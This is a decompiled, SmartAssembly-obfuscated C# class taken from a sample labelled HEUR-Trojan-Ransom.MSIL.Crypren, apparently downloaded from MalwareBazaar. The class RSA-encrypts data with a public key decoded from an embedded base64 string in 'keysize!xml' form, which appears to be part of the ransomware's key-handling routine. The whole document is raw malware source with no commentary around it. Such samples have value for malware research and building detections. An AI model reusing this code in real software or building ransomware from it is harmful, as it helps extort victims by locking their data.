// Decompiled with JetBrains decompiler
// Type: zvenNXaGjQywAfJS.FSXOXhUgBZ
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A95A28D5-8216-4857-B945-01900B674D16
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Crypren.gen-8a4a038a965ba42a0442d44abf25e4d21f5049d4a4a8aa9cb6691ec4282814a1.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace zvenNXaGjQywAfJS
{
  public static class FSXOXhUgBZ
  {
    private static bool IUHwkPrLOrmth;
    private static readonly string ISSkHYMRPVWLV;
    [NonSerialized]
    internal static GetString \u0011;

    public static string xjZeAJzrGxgor([In] string obj0)
    {
      int EtjdzlVJCNEP = 0;
      string nZtRZYouFrpnnfE = FSXOXhUgBZ.\u0011(107395131);
      FSXOXhUgBZ.sCkmduavkhKMK(FSXOXhUgBZ.ISSkHYMRPVWLV, out EtjdzlVJCNEP, out nZtRZYouFrpnnfE);
      return Convert.ToBase64String(FSXOXhUgBZ.nUcXGLzTQMktI(Encoding.UTF8.GetBytes(obj0), EtjdzlVJCNEP, nZtRZYouFrpnnfE));
    }

    private static byte[] nUcXGLzTQMktI([In] byte[] obj0, [In] int obj1, [In] string obj2)
    {
      if (obj0 == null || obj0.Length == 0)
        throw new ArgumentException(FSXOXhUgBZ.\u0011(107409550), FSXOXhUgBZ.\u0011(107409497));
      int num = FSXOXhUgBZ.hNtCRePFBKfh(obj1);
      if (obj0.Length > num)
        throw new ArgumentException(string.Format(FSXOXhUgBZ.\u0011(107409520), (object) num), FSXOXhUgBZ.\u0011(107409497));
      if (!FSXOXhUgBZ.XfZUGGSfnOOT(obj1))
        throw new ArgumentException(FSXOXhUgBZ.\u0011(107409483), FSXOXhUgBZ.\u0011(107409454));
      if (string.IsNullOrEmpty(obj2))
        throw new ArgumentException(FSXOXhUgBZ.\u0011(107409409), FSXOXhUgBZ.\u0011(107409412));
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(obj1))
      {
        cryptoServiceProvider.FromXmlString(obj2);
        return cryptoServiceProvider.Encrypt(obj0, FSXOXhUgBZ.IUHwkPrLOrmth);
      }
    }

    private static int hNtCRePFBKfh([In] int obj0) => FSXOXhUgBZ.IUHwkPrLOrmth ? (obj0 - 384) / 8 + 7 : (obj0 - 384) / 8 + 37;

    private static bool XfZUGGSfnOOT([In] int obj0) => obj0 >= 384 && obj0 <= 16384 && obj0 % 8 == 0;

    private static void sCkmduavkhKMK(
      string IQzbzomqVzfFD,
      out int EtjdzlVJCNEP,
      out string nZtRZYouFrpnnfE)
    {
      EtjdzlVJCNEP = 0;
      nZtRZYouFrpnnfE = FSXOXhUgBZ.\u0011(107395131);
      if (IQzbzomqVzfFD == null || IQzbzomqVzfFD.Length <= 0)
        return;
      string str = Encoding.UTF8.GetString(Convert.FromBase64String(IQzbzomqVzfFD));
      if (!str.Contains(FSXOXhUgBZ.\u0011(107409363)))
        return;
      string[] strArray = str.Split(new char[1]{ '!' }, 2);
      try
      {
        EtjdzlVJCNEP = int.Parse(strArray[0]);
        nZtRZYouFrpnnfE = strArray[1];
      }
      catch (Exception ex)
      {
      }
    }

    static FSXOXhUgBZ()
    {
      Strings.CreateGetStringDelegate(typeof (FSXOXhUgBZ));
      FSXOXhUgBZ.IUHwkPrLOrmth = false;
      FSXOXhUgBZ.ISSkHYMRPVWLV = FSXOXhUgBZ.\u0011(107409390);
    }
  }
}
